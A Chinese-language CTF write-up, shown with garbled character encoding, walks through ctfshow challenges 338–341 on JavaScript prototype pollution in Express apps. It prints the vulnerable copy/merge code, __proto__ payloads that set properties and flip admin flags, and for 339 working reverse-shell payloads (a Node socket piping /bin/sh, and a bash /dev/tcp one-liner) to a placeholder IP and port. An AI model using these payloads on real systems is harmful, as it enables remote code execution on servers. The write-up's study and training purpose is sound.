<p>å¯è§ï¼Œæ–°å»ºçš„ o3 å¯¹è±¡ï¼Œä¹Ÿå­˜åœ¨ b å±æ€§ï¼Œè¯´æ˜ Object å·²ç»è¢«æ±¡æŸ“ï¼Œå› ä¸º JSON è§£æä¸‹ï¼Œ__proto__ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨é o2 æ—¶ä¼šå­˜åœ¨è¿™ä¸ªé”®</p>
<p>merge æ“ä½œæ—¶æœ€å¸¸è§çš„å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜</p>
<p>æœ‰å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“ï¼Ÿå“ªäº›æƒ…å†µåŸå‹é“¾èƒ½è¢«ä¿®æ”¹å‘¢ï¼Ÿå“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®__proto__çš„å€¼å‘¢ï¼Ÿ<br>å…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯ï¼š</p>
<ul>
<li>å¯¹è±¡ merge</li>
<li>å¯¹è±¡ cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡ merge åˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li>
</ul>
<blockquote>
<p>å­˜åœ¨å½±å“ç›®æ ‡ç±»å‹çš„åŒå‹ï¼Œè¯¥åŒå‹çš„å‚æ•°å¯æ§</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E6%B1%A1%E6%9F%93.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>åŸå‹é“¾æ±¡æŸ“</strong>åˆ©ç”¨çš„å…³é”®å°±æ˜¯æ‰¾åˆ°å¯ä»¥è¦†ç›–çš„å±æ€§æˆ–è€…æ–¹æ³•ã€‚</p>
<p>è¿™ç±»æ¼æ´çš„å…³é”®ä¸»è¦æ˜¯åœ¨ compile ç¼–è¯‘ æˆªæ–­ï¼Œé€šè¿‡åŸå‹é“¾æ±¡æŸ“è¦†ç›–æŸäº›å±æ€§ï¼Œåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­æ³¨å…¥æ¨¡æ¿ï¼Œåœ¨æ¸²æŸ“çš„æ—¶å€™å°±ä¼šæ‰§è¡Œæˆ‘ä»¬æ³¨å…¥çš„æ¶æ„ä»£ç ã€‚</p>
<p>é™åˆ¶ï¼š</p>
<ul>
<li>ä¿è¯èƒ½å¤Ÿæ‰§è¡Œåˆ°æ¸²æŸ“é˜¶æ®µï¼Œå› ä¸ºè¦†ç›–æŸäº›å±æ€§ä¼šå¯¼è‡´è«åå…¶å¦™çš„å¼‚å¸¸</li>
<li>è¢«è¦†ç›–çš„å±æ€§æ— ç¡¬ç¼–ç é»˜è®¤å€¼</li>
</ul>
<h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h4><p>ä¸‹è½½é™„ä»¶</p>
<blockquote>
<p>npm install</p>
<p>node bin/www</p>
</blockquote>
<p>index.jsï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; title: <span class="hljs-string">&#x27;Express&#x27;</span> &#125;);<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure>

<p>login.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user,req.body);<br>  <span class="hljs-keyword">if</span>(secert.ctfshow===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123;ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+JSON.stringify(user)&#125;);<br>  &#125;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure>

<p>common.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = &#123;<br>  copy:copy<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (let key in object2) &#123;<br>        <span class="hljs-keyword">if</span> (key in object2 &amp;&amp; key in object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>é¦–é¡µè²Œä¼¼æ²¡å•¥ç”¨ï¼Œåœ¨ login.js ä¸­çœ‹åˆ° secert æ²¡æœ‰ ctfshow è¿™ä¸ªå±æ€§ï¼Œè€Œ<code>secert.ctfshow===&#39;36dboy&#39;</code>å°±æœ‰ flagï¼Œæˆ‘ä»¬å‘ç° select æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè€Œ user ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„(å…·æœ‰åŒå‹)ï¼Œè€Œä¸”é€šè¿‡<code>utils.copy(user,req.body)</code>ä¼ å…¥æ•°å€¼(copy å’Œ merge ç±»æ¯”)ï¼Œreq.body æ˜¯ POST è¯·æ±‚(å‚æ•°å¯æ§)</p>
<p>é‚£ä¹ˆæŠ“åŒ…ä¼ å…¥å³å¯</p>
<blockquote>
<p>{â€œ__proto__â€œ:{â€œctfshowâ€:â€36dboyâ€}}</p>
</blockquote>
<h4 id="ctfshow339"><a href="#ctfshow339" class="headerlink" title="ctfshow339"></a>ctfshow339</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user, req.body);<br>  <span class="hljs-keyword">if</span> (secert.ctfshow === flag) &#123;<br>    res.end(flag);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span> + JSON.stringify(user) &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>å’Œ 338 ä¸åŒçš„æ˜¯ ctfshow===å˜é‡ï¼Œæˆ‘ä»¬å¯çŸ¥æœ€åçš„ 32 ä½å­—ç¬¦ä¸²å°±åœ¨è¿™å˜é‡ flagï¼Œæ˜¯ä¸å¯é¢„æµ‹çš„å€¼ï¼›å¤šäº†ä¸€ä¸ª api.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;api&#x27;</span>, &#123; query: <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">query</span>)(<span class="hljs-params">query</span>)&#125;)</span>;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬æ±¡æŸ“ç‚¹ä¸€æ ·ï¼Œä»ç„¶æ˜¯</p>
<blockquote>
<p>let user = {};<br>utils.copy(user,req.body);</p>
</blockquote>
<p>è§¦å‘ç‚¹ï¼š</p>
<blockquote>
<p>res.render(â€˜apiâ€™, { query: Function(query)(query)});</p>
</blockquote>
<p>åŒ¿åå‡½æ•°ï¼Œå’Œ Code-Breaking Thejs å¾ˆç›¸åƒ</p>
<blockquote>
<p>Function(query)(query)è¿™ç§åŒ¿åå‡½æ•°çš„å†™æ³•ï¼Œquery ä¸å†æ˜¯ä¼ æ•°å€¼ï¼Œè€Œæ˜¯ä¼ å…¥æ‰§è¡Œä»£ç ï¼Œç„¶åè‡ªæ‰§è¡Œã€‚æœ‰ç‚¹å’Œ eval ç±»ä¼¼ï¼Œä½†è¿™é‡Œæ›´å¥½çš„è§£é‡Šæ˜¯ Function å¯¹è±¡</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p>
<p>å®˜æ–¹æ˜¯è¿™æ ·å®šä¹‰çš„ï¼š<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼‰</a>æ˜¯ä¸€ä¸ªåœ¨å®šä¹‰æ—¶å°±ä¼šç«‹å³æ‰§è¡Œçš„ JavaScript å‡½æ•°ã€‚</p>
</blockquote>
<p>ç„¶åæƒ³æ³•æ˜¯é€šè¿‡ login.js çš„ copy æ±¡æŸ“åˆ° api.js çš„ queryï¼Œåå¼¹ä¸€ä¸ª shell</p>
<p>js å¦‚ä½•åå¼¹ shell<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//jsåŸç”Ÿsocketå»ºç«‹è¿æ¥</span><br><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, [])<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(ç›‘å¬ç«¯å£, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br><span class="hljs-comment">//æ±¡æŸ“ä¼ å…¥</span><br>&#123;<br>	<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br>	<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>	&#125;<br>&#125;<br><br><span class="hljs-comment">//æ‹¼æ¥</span><br>&#123;<br>	<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br>	<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = require(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = require(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(ç›‘å¬ç«¯å£, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>éœ€è¦å¯¹ä¸Šé¢çš„ä»£ç â€æ ¼å¼åŒ–â€œï¼Œpayloadï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(ç›‘å¬ç«¯å£, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¼ å…¥æ‹¼æ¥å®Œæˆçš„ payloadï¼Œpost ä¼ è‡³/loginï¼Œæ¥ç€è®¿é—®/api è§¦å‘åæ— å“åº”ï¼Œæ£€æŸ¥å‘ç°éš§é“å¯åŠ¨æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•è¿æ¥</p>
<p>è§£é‡Šå¦‚ä¸‹ï¼š</p>
<ul>
<li>Function ä¸­ require æ˜¯æ¨¡å—å†…çš„ï¼Œæ— æ³•è°ƒç”¨å…¨å±€å˜é‡</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/nodejs/node-v0.x-archive/issues/2017">https://github.com/nodejs/node-v0.x-archive/issues/2017</a></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211121223733792.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>å› ä¸º node æ˜¯åŸºäº chrome v8 å†…æ ¸çš„ï¼Œè¿è¡Œæ—¶ï¼Œå‹æ ¹å°±ä¸ä¼šæœ‰ <code>require</code> è¿™ç§å…³é”®å­—ï¼Œæ¨¡å—åŠ è½½ä¸è¿›æ¥ï¼Œè‡ªç„¶ shell å°±åå¼¹ä¸äº†äº†ã€‚ä½†åœ¨ node äº¤äº’ç¯å¢ƒï¼Œæˆ–è€…å†™ js æ–‡ä»¶æ—¶ï¼Œé€šè¿‡ node è¿è¡Œä¼šè‡ªåŠ¨æŠŠ <code>require</code> è¿›è¡Œç¼–è¯‘ã€‚</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122000430212.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing">https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing</a></p>
<p>æ­¤å¤„çš„åŒ¿åå‡½æ•°åŸå‹æ˜¯é€šè¿‡<code>new Function()</code>åˆ›å»ºè€Œæ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç­‰ä»·äºä¸Šé¢çš„æˆªå›¾æƒ…å½¢ï¼Œæ²¡æ³•ç›´æ¥åœ¨<code>Function</code>ä¸­å¼•å…¥ <code>require</code></p>
<p>æ€»ç»“å°±æ˜¯ï¼Œä½¿ç”¨çš„æ˜¯ nodejs æ­å»ºçš„æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ requireï¼Œä½†å®ƒæ— æ³•åœ¨åŒ¿åå‡½æ•°å†…è°ƒç”¨å…¨å±€å˜é‡(http)ï¼Œæ¢ä¸€ç§å†™æ³•</p>
<blockquote>
<p>var require = global.require || global.process.mainModule.constructor._load</p>
</blockquote>
<p>åŒæ—¶å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çœ‹åˆ° nodejs æ˜¯é¢å‘æœåŠ¡å™¨ç«¯çš„ï¼Œå®ƒå…·æœ‰ require å…³é”®å­—ï¼Œä½†åœ¨æµè§ˆå™¨çš„æ§åˆ¶å°æ˜¯æ²¡æœ‰çš„</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, []);<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(ç›‘å¬ç«¯å£, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br>&#123;<br>	<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br>	<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(ç›‘å¬ç«¯å£, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(ç›‘å¬ç«¯å£, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æˆ–è€…ï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯ windows ç³»ç»Ÿå°±æŠŠ <code>/bin/sh</code> æ¢æˆ <code>cmd.exe</code> å°±å¯ä»¥äº†</p>
<h4 id="ctfshow-340"><a href="#ctfshow-340" class="headerlink" title="ctfshow 340"></a>ctfshow 340</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> router = express.Router()<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>)<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(), <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.userinfo = <span class="hljs-keyword">new</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-built_in">this</span>.isVIP = <span class="hljs-literal">false</span><br>      <span class="hljs-built_in">this</span>.isAdmin = <span class="hljs-literal">false</span><br>      <span class="hljs-built_in">this</span>.isAuthor = <span class="hljs-literal">false</span><br>    &#125;)()<br>  &#125;)()<br>  utils.copy(user.userinfo, req.body)<br>  <span class="hljs-keyword">if</span> (user.userinfo.isAdmin) &#123;<br>    res.end(flag)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; <span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span> &#125;)<br>  &#125;<br>&#125;)<br><span class="hljs-built_in">module</span>.exports = router<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œé¢çš„ userinfo åŸå‹ä¸åŒäº†</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122183340194.png" srcset="/img/loading.gif" lazyload></p>
<p>å†å¥—ä¸€ä¸ª<code>__proto__</code>å³å¯</p>
<h4 id="ctfshow-341"><a href="#ctfshow-341" class="headerlink" title="ctfshow 341"></a>ctfshow 341</h4><p>è¿™é‡Œä»‹ç»ä¸¤ä¸ªè‡ªåŠ¨åŒ–æ‰¾æ´ï¼š</p>
<p>snyk çš„ä½¿ç”¨</p>
<p>åœ¨å®˜ç½‘æ³¨å†Œç™»å½•ï¼Œåˆæ¬¡ç™»å½•è¦å…³è” Githubï¼Œæ‰¾åˆ° apiï¼Œæœ¬åœ°ï¼š</p>
<blockquote>
<p>npm install snyk -g</p>
<p>snyk config set api=</p>
<p>snyk test</p>
</blockquote>
<p>audit çš„ä½¿ç”¨</p>
<blockquote>
<p>npm audit</p>
</blockquote>
<ul>
<li>ejs</li>
</ul>
<p>å› ä¸ºè¿™é¢˜æ²¡æœ‰/api è§¦å‘ç‚¹ï¼Œä½¿ç”¨ 338 å­˜åœ¨çš„ ejs RCEï¼Œå› ä¸ºæ˜¯éé¢„æœŸæ²¡æœ‰æ”¾å‡ºæ¥ï¼Œä½¿ç”¨ snyk æ‰«å‡ºæ¥</p>
<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-EJS-1049328">https://security.snyk.io/vuln/SNYK-JS-EJS-1049328</a></p>
